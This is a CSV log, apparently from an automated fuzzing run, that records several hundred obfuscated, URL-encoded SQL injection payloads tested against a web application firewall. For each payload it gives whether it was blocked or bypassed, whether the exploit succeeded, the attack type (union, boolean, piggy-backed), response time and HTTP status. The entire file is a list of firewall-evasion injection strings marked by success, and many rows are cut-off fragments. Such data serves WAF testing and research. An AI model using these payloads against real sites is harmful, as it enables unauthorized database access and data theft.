Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1+||+!+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0138,70.23,No,200
0%27<@=1.+or%0bnot+{x+(select+1)}=1=+(not+{`if`,Blocked,No,None,Unknown,0.012,70.23,No,403
0%27<@=.1%0b||%0b!+{a%0b1}=1=%0b(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0154,70.23,No,200
0%27<@=.1+or%0b!+{a+1}=1=%0b(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0128,70.23,No,200
0%27<@!=1+||+not+{a+1}=1=+(not%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0095,70.4,No,200
0'<@=.1+||+!+{x+(select+1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0111,70.85,No,403
0'<@=1.+||+not+{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0129,71.05,No,500
0%27<@=1.%0bor%0bnot~0=+(!+{a%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0143,71.11,No,200
0%27<@=.1+||+!%0b{`if`+1}=1=%0b(false)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0146,71.11,No,200
0'<@=.1+or+not+{x%0b(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0088,71.11,No,500
0%27<@=.1%0bor%0b!+{x+(select+1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0186,71.11,No,200
0'<@!=1.+||+not%0b1=+(!%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0119,71.11,No,500
0'or+!@<@.%0bor%0bnot+{a+1}=1=%0b(not+,Bypassed,No,None,Unknown,0.0109,71.11,No,500
0'<@!=1.+||+not+true=%0b(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0129,71.11,No,500
0'<@!=.1%0b||+!+{x+(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.008,71.11,No,500
0'<@=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b,Blocked,No,None,Unknown,0.0061,71.11,No,403
0'<@!=.1%0b||+not+{`if`+1}=1=%0b(not+{x%0b(select,Bypassed,No,None,Unknown,0.0142,71.11,No,500
0'<@!=.1+or+!%7efalse=+(!+1)%0b||,Bypassed,No,None,booleanAtk,0.0172,71.11,No,500
0%27<@=1.+||%0b!%0btrue=+(0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0153,71.11,No,200
0%27<@=.1+||%0b!%0b{x%0b(select%0b1)}=1=%0b(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0138,71.11,No,200
0%27<@=1.%0b||+not%7efalse=+(!+{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0095,71.11,No,200
0'<@!=1.%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(!%0b{a,Bypassed,No,None,Unknown,0.0147,71.11,No,500
0'<@!=1.+or+!+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0071,71.11,No,403
0%27<@=1.+||+!+{a%0b1}=1=%0b(not%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0142,71.11,No,200
0%27or+!@<@.%0bor%0b1%0blike%0b{a%0b1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.012,71.11,No,200
0'<@!=1+||%0b!+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,No,None,Unknown,0.0118,71.11,No,500
0'<@=.1+or%0bnot+{a+1}=1=%0b(!+{`if`+,Bypassed,No,None,Unknown,0.0245,71.11,No,500
0%27<@=1%0b||%0bnot~0=+(!+true)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0115,71.11,No,200
0'<@!=1.+or%0bnot+{x+(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0133,71.11,No,403
0'<@=1+||%0bnot%0b{x%0b(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.0099,71.11,No,403
0'<@!=1.%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0179,71.11,No,500
0'<@=1%0bor+!%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0074,71.11,No,500
0'<@=.1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(!~,Bypassed,No,None,Unknown,0.0155,71.11,No,500
0%27<@!=1.%0b||%0bnot+{a+1}=1=+(!+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0098,71.11,No,200
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0184,71.11,No,403
0%27<@!=.1%0bor+not%0b1%0bis+false+or',Bypassed,No,None,booleanAtk,0.0148,71.11,No,500
0'||+@<@.+||%0b{`if`+1}=1+like+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0112,71.11,No,500
0'<@!=1.%0bor%0b!+{a+1}=1=+(not~false),Bypassed,No,None,booleanAtk,0.0094,71.11,No,500
0%27<@!=1.%0b||%0b~%0b{`if`%0b1}=1=+({a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.11,No,200
0'<@!=1%0bor%0b!+{a+1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0145,71.11,No,500
0'<@!=.1+||+!%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0134,71.11,No,500
0%27<@!=.1%0b||+not%7e0=+(not%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0185,71.11,No,200
0'or+@<@.+or%0bnot+{`if`+1}=1=+(!+,Bypassed,No,None,Unknown,0.0169,71.11,No,500
0%27<@=1%0bor+not+{x%0b(select+1)}=1=+(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0167,69.83,No,200
0%27<@!=1%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0125,70.23,No,200
0'<@=1%0b||+!+{x+(select%0b1)}=1=+(!+true,Bypassed,No,None,Unknown,0.0097,70.23,No,500
0%27<@!=1+||%0b{a%0b1}=1%0blike%0b{x+(select+1)}=1%23,Blocked,No,None,piggyAtk,0.009,70.23,No,403
0%27<@=1+or+not+{x+(select+1)}=1=+(not%0b1,Blocked,No,None,Unknown,0.0133,70.23,No,403
0'<@!=.1+or%0bnot+{a+1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0054,70.23,No,500
0'<@=1.+||+not+1=%0b(not+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0142,70.23,No,500
0%27<@=1.%0b||%0bnot%0b{x+(select+1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0141,70.23,No,200
0'<@=.1%0b||+0=+(!%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0135,70.23,No,500
0'<@=.1+or+not+{x+(select+1)}=1=+(not+{a,Blocked,No,None,Unknown,0.0106,70.23,No,403
0%27<@=1.+or%0bnot+{a+1}=1=%0b(!+true),Bypassed,Yes,unionAtk,booleanAtk,0.0145,70.23,No,200
0%27<@!=1.+||+{x%0b(select+1)}=1+like+{x+(select+1)}=1+,Bypassed,Yes,unionAtk,Unknown,0.0107,70.23,No,200
0%27<@!=.1+or+!+{a%0b1}=1=%0b(not%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.013,70.61,No,200
0'<@!=1.%0bor%0b!%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0212,71.05,No,500
0%27or+@<@.%0b||+!+{x%0b(select+1)}=1=+(!,Bypassed,Yes,unionAtk,Unknown,0.0095,71.11,No,200
0%27<@=1+||+!%0b{`if`%0b1}=1=%0b(false)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0149,71.11,No,200
0'<@=.1%0b||+!+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0154,71.11,No,500
0'<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(not+true),Bypassed,No,None,Unknown,0.0159,71.11,No,500
0'<@=.1%0b||+not%0b1=+(not+1)--%0b,Bypassed,No,None,piggyAtk,0.0215,71.11,No,500
0%27<@=1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0142,71.11,No,200
0%27or+!@<@+or+{a+1}=1%0blike+{`if`%0b1}=1+||,Bypassed,Yes,unionAtk,Unknown,0.0142,71.11,No,200
0%27<@!=1.+||+!+{x+(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0164,71.11,No,403
0%27<@=1.+||+!%0b{a+1}=1=%0b(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0091,71.11,No,200
0'<@=1%0b||%0b!+{`if`%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0193,71.11,No,500
0'<@=.1%0b||+{`if`+1}=1+like+true%0bor%27,Bypassed,No,None,booleanAtk,0.0127,71.11,No,500
0%27<@!=1%0b||+!+{a+1}=1%0bis%0bfalse+or',Bypassed,No,None,booleanAtk,0.0087,71.11,No,500
0%27<@!=1%0b||%0bnot+{a+1}=1=+(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0125,71.11,No,200
0%27or%0b1<@.+||%0bnot+{x+(select%0b1)}=1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0101,71.11,No,200
0'<@!=1+or%0b!+{a+1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0126,71.11,No,500
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0191,71.11,No,200
0%27<@=.1+||+not+{`if`+1}=1=%0b(not+true),Bypassed,Yes,unionAtk,Unknown,0.0121,71.11,No,200
0%27<@=1%0bor%0bnot+{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0136,71.11,No,200
0'<@!=1+||%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0129,71.11,No,500
0'<@!=1.+||%0bnot+1=+(!+1)+||,Blocked,No,None,Unknown,0.0194,71.11,No,403
0'<@!=1%0bor%0bnot+{a%0b1}=1=+(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0127,71.11,No,500
0%27<@!=.1+or%0bnot+{x%0b(select+1)}=1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0076,71.11,No,200
0%27<@!=1.%0b||%0b!+{a%0b1}=1=+(not%7efalse),Bypassed,Yes,unionAtk,Unknown,0.0158,71.11,No,200
0'<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0095,71.11,No,403
0'<@!=.1+or%0b!+{a+1}=1=%0b(not%0b{a+1}=1,Bypassed,No,None,Unknown,0.0218,71.11,No,500
0'<@=1.%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0122,71.11,No,500
0'<@=.1+or+not%0b{`if`+1}=1=%0b(not~0),Bypassed,No,None,Unknown,0.0129,71.11,No,500
0'<@!=.1+||+0=%0b(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0068,71.11,No,500
0%27<@=.1+||%0bnot%0b{x%0b(select+1)}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.11,No,200
0%27<@=.1%0b||%0bnot%0b{`if`+1}=1=%0b(!%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0176,71.11,No,200
0%27<@=.1+or+!%0btrue=%0b(!+{`if`+1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0137,71.11,No,200
0'<@!=1+or%0b!%0b{x+(select%0b1)}=1=+(!+,Blocked,No,None,Unknown,0.0124,71.11,No,403
0%27<@!=1+or+not+{x+(select%0b1)}=1=+(not+{`if`,Blocked,No,None,Unknown,0.0103,71.11,No,403
0'<@=.1%0b||+not%0b{`if`%0b1}=1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0168,71.11,No,500
0'<@=1.%0bor+!%0b1=%0b(not+{`if`+1}=1),Bypassed,No,None,Unknown,0.0225,71.11,No,500
0%27<@=1.+or+!%0b1=%0b(!+true)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0237,71.11,No,200
0'<@=.1+||+not%0b{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0052,70.23,No,500
0'<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0084,70.23,No,500
0%27<@!=.1%0bor+not+{x+(select+1)}=1=+(!+{a,Bypassed,Yes,unionAtk,Unknown,0.0209,70.23,No,200
0%27<@=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0115,70.23,No,200
0'<@=1+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0056,70.23,No,403
0'<@=.1%0bor%0b!+{x+(select+1)}=1=%0b(!%0b1,Bypassed,No,None,Unknown,0.0223,70.23,No,500
0%27<@!=1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0076,70.23,No,200
0'<@!=1.+||+!+{a%0b1}=1=+(not%7efalse),Bypassed,No,None,Unknown,0.0151,70.23,No,500
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(!~false,Blocked,No,None,booleanAtk,0.0161,70.23,No,403
0'<@!=1.+or%0b!+{x%0b(select%0b1)}=1=+(!+,Bypassed,No,None,Unknown,0.0106,70.23,No,500
0'<@=1.%0bor%0b{x%0b(select%0b1)}=1+like+{x+(select%0b1)}=1%0b,Bypassed,No,None,Unknown,0.0199,70.61,No,500
0'<@=1.+||+{x+(select+1)}=1+like%0b{x%0b(select+1)}=1%23,Blocked,No,None,piggyAtk,0.0127,71.05,No,403
0'<@=.1%0bor%0bnot+{`if`%0b1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0154,71.11,No,500
0%27<@!=.1+or%0b!+{`if`+1}=1=+(!%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0202,71.11,No,200
0'<@=1.+||+not+{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0125,71.11,No,500
0%27<@=1+or+not%0b{`if`+1}=1=%0b(not%0btrue),Bypassed,Yes,unionAtk,booleanAtk,0.0101,71.11,No,200
0%27<@=.1+or+{x%0b(select%0b1)}=1%0blike%0b{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0123,71.11,No,500
0%27<@!=1+||+not%0b1=+(!+true)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.0122,71.11,No,200
0%27<@!=.1%0b||+!%0b1=+(!+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0074,71.11,No,200
0'<@=1.+or+{`if`%0b1}=1+like%0b{x%0b(select+1)}=1%0bor',Bypassed,No,None,Unknown,0.0108,71.11,No,500
0'<@=1.%0bor%0bnot%0b{a%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0189,71.11,No,500
0'<@!=1.%0b||%0bnot%0b1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.008,71.11,No,500
0'<@=1.+||%0bnot%0b{a+1}=1=+(not+{a%0b,Bypassed,No,None,Unknown,0.0097,71.11,No,500
0%27||%0b1<@+||+{a%0b1}=1%0blike%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0104,71.11,No,200
0'<@!=1+||+not+true=+(!%0b{`if`%0b1}=1),Bypassed,No,None,Unknown,0.021,71.11,No,500
0'<@=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0127,71.11,No,500
0%27<@=.1+or%0b!+{x+(select+1)}=1=%0b(!+true,Blocked,No,None,booleanAtk,0.0103,71.11,No,403
0'<@!=1.+or%0b!+1=+(not%0b{a%0b1}=1),Bypassed,No,None,Unknown,0.0142,71.11,No,500
0'<@=1.+or+not+{`if`+1}=1=%0b(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0075,71.11,No,500
0%27<@=.1+or%0bnot+{`if`%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0121,71.11,No,200
0'<@=1%0bor+!+{x+(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0184,71.11,No,500
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(false),Bypassed,Yes,unionAtk,Unknown,0.0163,71.11,No,200
0%27<@!=1.+or%0bnot%0btrue=+(!%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0194,71.11,No,200
0%27<@!=1.%0bor+!%0btrue=+(!+{a%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0144,71.11,No,200
0%27<@!=.1%0bor%0b!%0b{a+1}=1=+(not%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0096,71.11,No,200
0'<@!=1+or+not~false=%0b(not%0b{`if`+1}=1),Bypassed,No,None,booleanAtk,0.0113,71.11,No,500
0%27<@!=1+or%0bnot%7efalse=%0b(not+{`if`%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0124,71.11,No,200
0%27<@!=1.%0bor%0bnot+1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0147,71.11,No,200
0'<@!=.1%0bor%0bnot~false=+(not+{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0115,71.11,No,500
0%27<@!=.1%0bor%0b!%0b{a+1}=1=%0b(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0149,71.11,No,200
0%27<@!=.1%0bor%0bnot%0b{a+1}=1=%0b(not~false),Bypassed,Yes,unionAtk,booleanAtk,0.017,71.11,No,200
0'<@=1%0b||+!%0b1=+(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0131,71.11,No,500
0'<@=1%0b||+not+{a+1}=1=%0b(not+{`if`%0b1}=1,Bypassed,No,None,Unknown,0.012,71.11,No,500
0%27||%0b!@<@.+or+!+true=+(not%0b{x%0b,Blocked,No,None,booleanAtk,0.01,71.11,No,403
0'<@!=1%0b||%0bnot+1=+(not+1)%0bor,Bypassed,No,None,Unknown,0.0138,71.11,No,500
0%27<@=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,71.11,No,200
0%27<@!=.1%0b||+!%0b{x%0b(select%0b1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0167,71.11,No,200
0%27<@=1.%0b||%0b!%0b{a+1}=1=%0b(!%7e0),Bypassed,Yes,unionAtk,Unknown,0.0075,71.11,No,200
0%27<@=1+or+!+{x+(select%0b1)}=1=+(not+,Blocked,No,None,Unknown,0.0055,71.11,No,403
0'<@!=1.+||%0b!+{x+(select%0b1)}=1=+(!%0b{x,Blocked,No,None,Unknown,0.0108,71.11,No,403
0'<@=.1%0b||+not%0b1=%0b(not%7efalse)%0b||,Bypassed,No,None,Unknown,0.0204,69.98,No,500
0%27<@=1%0bor+!+{x%0b(select+1)}=1=+(!+1,Bypassed,Yes,unionAtk,Unknown,0.0177,70.23,No,200
0'<@=.1+||%0bfalse=+(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0073,70.23,No,500
0'<@=1%0b||+!+{a%0b1}=1=+(not+{a+,Bypassed,No,None,Unknown,0.0154,70.23,No,500
0'<@=.1+or+not%0b{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0106,70.23,No,500
0'<@=.1+||%0b!+{x+(select%0b1)}=1=%0b(not+{a,Blocked,No,None,Unknown,0.0122,70.23,No,403
0'<@!=.1%0bor+!+{`if`+1}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.0136,70.23,No,500
0'<@=.1+or+not+{x%0b(select+1)}=1=%0b(not%0b{`if`,Bypassed,No,None,Unknown,0.0204,70.23,No,500
0%27||%0b@<@.+or+{a+1}=1%0blike+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0111,70.23,No,200
0'<@!=1.+or%0b{a+1}=1+like%0b{x%0b(select+1)}=1%23,Bypassed,No,None,piggyAtk,0.0244,70.23,No,500
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(not+true,Blocked,No,None,booleanAtk,0.0067,70.52,No,403
0'<@!=.1%0bor+not+{`if`%0b1}=1=+(not%7e0),Bypassed,No,None,Unknown,0.0181,71.05,No,500
0%27<@!=.1%0b||+!+{x+(select%0b1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0091,71.11,No,200
0'<@!=1+||+not+{`if`+1}=1=%0b(!+1),Bypassed,No,None,Unknown,0.0127,71.11,No,500
0'<@=.1+||+not+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0113,71.11,No,500
0%27<@!=1.+||+not+{`if`+1}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0053,71.11,No,200
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,71.11,No,200
0'<@=1+||+not%0b{a+1}=1=+(not%0btrue),Bypassed,No,None,Unknown,0.0134,71.11,No,500
0%27<@!=.1+||%0b!+true=%0b(!+{x%0b(select%0b,Bypassed,Yes,unionAtk,Unknown,0.015,71.11,No,200
0'<@!=1+or+!+{a+1}=1=+(not%7e0),Bypassed,No,None,Unknown,0.0149,71.11,No,500
0%27<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0206,71.11,No,200
0'<@=1+||+not+{`if`%0b1}=1=+(not%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0147,71.11,No,500
0'<@=1.+||+!+{a+1}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.0122,71.11,No,500
0'<@!=1.+or+not%0b{a+1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Unknown,0.0117,71.11,No,500
0%27<@=1%0b||+not+{`if`%0b1}=1=%0b(!+1),Bypassed,Yes,unionAtk,Unknown,0.0125,71.11,No,200
0'<@!=1%0bor+!~0=%0b(not%0b1)%0bor,Bypassed,No,None,Unknown,0.0124,71.11,No,500
0'<@=.1%0b||+!%0b{x+(select%0b1)}=1=%0b(not%0b{a,Bypassed,No,None,Unknown,0.0197,71.11,No,500
0'<@=1+or%0bnot+{x+(select%0b1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0152,71.11,No,403
0%27<@!=.1+or+not%0b{x+(select+1)}=1=%0b(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.014,71.11,No,200
0%27<@=1.%0bor+{x%0b(select%0b1)}=1+like+{`if`+1}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0173,71.11,No,200
0'<@=1%0b||%0b!+1=+(!%7efalse)+||,Bypassed,No,None,Unknown,0.0218,71.11,No,500
0%27<@=.1%0bor%0bnot%0b{`if`%0b1}=1=+(!%7efalse),Bypassed,Yes,unionAtk,booleanAtk,0.0128,71.11,No,200
0'<@!=1+or+!+{x+(select+1)}=1=+(0),Blocked,No,None,Unknown,0.0126,71.11,No,403
0'<@!=.1+or+not%0b{x+(select%0b1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0145,71.11,No,500
0'<@!=1.+or+not%0b{a+1}=1=+(!+{`if`+1}=1,Bypassed,No,None,Unknown,0.0144,71.11,No,500
0%27<@=1.%0b||+!%0b{a+1}=1=%0b(not%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0239,71.11,No,200
0%27<@=1+||+not%0b{a+1}=1=%0b(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0194,71.11,No,200
0'<@=1%0bor+!+{x+(select%0b1)}=1=+(not%0b{x,Bypassed,No,None,Unknown,0.0153,71.11,No,500
0%27<@=.1%0b||+not+1=+(not+1)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0187,71.11,No,200
0%27<@!=.1%0bor+not%0b{`if`%0b1}=1=+(not%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0132,71.11,No,200
0%27or%0b@<@.+or+{`if`+1}=1+like+{`if`+1}=1+||,Bypassed,Yes,unionAtk,Unknown,0.0149,71.11,No,200
0%27<@!=1.+or+{x+(select+1)}=1+like%0b{x+(select%0b1)}=1--,Blocked,No,None,piggyAtk,0.0121,71.11,No,403
0%27<@=1.+or+!~0=+(!%0b{`if`%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0137,71.11,No,200
0%27<@=.1+||+not%0b{`if`%0b1}=1=+(!+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.11,No,200
0%27<@=.1+||+not+true=%0b(not+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0161,71.11,No,200
0'<@!=.1%0b||+not+{`if`%0b1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0179,71.11,No,500
0'<@!=1.+||+!+1=%0b(!%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0135,71.11,No,500
0%27<@=1%0b||+!%0b1=%0b(not+1)+||,Bypassed,Yes,unionAtk,Unknown,0.0196,71.11,No,200
0'<@=.1%0b||+!+{x%0b(select%0b1)}=1=+(!%0b{`if`,Bypassed,No,None,Unknown,0.0122,71.11,No,500
0'<@=.1+||%0b!%0b{x+(select+1)}=1=%0b(not%0b,Blocked,No,None,Unknown,0.0087,71.11,No,403
0%27or+!@<@.%0b||%0bnot+{x+(select%0b1)}=1=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0139,70.23,No,200
0'<@!=1.+or%0b!%0b{x+(select+1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0085,70.23,No,403
0%27<@=.1+or%0b!%0b{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0164,70.23,No,200
0'<@!=1%0bor%0bnot%0b{`if`+1}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.0082,70.23,No,500
0'<@=.1%0bor%0bnot+1=+(not%7efalse)+or,Bypassed,No,None,booleanAtk,0.0107,70.23,No,500
0%27<@=1.+||%0b!%7efalse=+(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0225,70.23,No,200
0'<@!=.1+or%0b!+{`if`%0b1}=1=+(!%0b{x+(select,Bypassed,No,None,Unknown,0.012,70.23,No,500
0'<@=1+||+!%0b{x%0b(select+1)}=1=+(not%0b{x,Bypassed,No,None,Unknown,0.0114,70.23,No,500
0'<@!=1+||%0b!%0b{a+1}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0112,70.23,No,500
0'<@!=1+or+not+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,No,None,Unknown,0.0089,70.23,No,500
0%27<@!=.1+||+!%0b{a%0b1}=1=%0b(0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.021,70.47,No,200
0'<@=1%0bor+{x%0b(select%0b1)}=1%0blike+{x+(select+1)}=1%23,Bypassed,No,None,piggyAtk,0.0212,71.05,No,500
0%27<@!=.1+or+!+{x+(select+1)}=1=%0b(not+{a,Blocked,No,None,Unknown,0.0107,71.11,No,403
0'<@!=1+||%0bnot+{`if`+1}=1=%0b(!%0b{a+,Bypassed,No,None,Unknown,0.023,71.11,No,500
